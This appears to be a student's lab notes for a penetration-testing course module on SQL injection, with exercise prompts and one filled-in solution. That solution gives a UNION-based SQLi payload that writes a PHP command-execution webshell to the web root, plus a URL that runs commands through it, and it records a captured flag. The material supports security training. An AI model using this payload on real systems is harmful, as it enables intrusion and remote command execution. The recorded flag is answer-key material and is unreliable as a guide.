

2. Connect to the MySQL VM 2 and repeat the steps illustrated in this section in order to manually exploit the UNION-based SQLi.
	   Once you have obtained a webshell, gather the flag that is located in the same **tmp** folder.

- Auth bypass
![](10ex_authBypass.png)

- Find # of columns
![](10ex_orderby6.png)

- Insert webshell
```sql
%' union select "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"-- 
```

- Cat flag
```bash
# In URL
http://192.168.246.19/tmp/webshell.php?cmd=cat%20flag.txt
```


> Answer:  OS{42b86739388422346bc1c9f4e730d3aa}





3. Connect to the MySQL VM 3 and automate the SQL injection discovery via sqlmap as shown in this section. 
	   Then dump the _users_ table by abusing the time-based blind SQLi and find the flag that is stored in one of the table's records.

> Answer:  .

4. **Capstone Exercise**: Enumerate the Module Exercise - VM #1 and exploit the SQLi vulnerability in order to get the flag.
	   Hint: To enhance the attack efficiency, it's recommended to manually identify the injection point before deploying any automated tool, such as SQLMap on the target.

> Answer:  .

5. **Capstone Exercise**: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability in order to get the flag.

> Answer:  .

6. **Capstone Exercise**: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.

> Answer:  .

7. **Capstone Exercise**: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.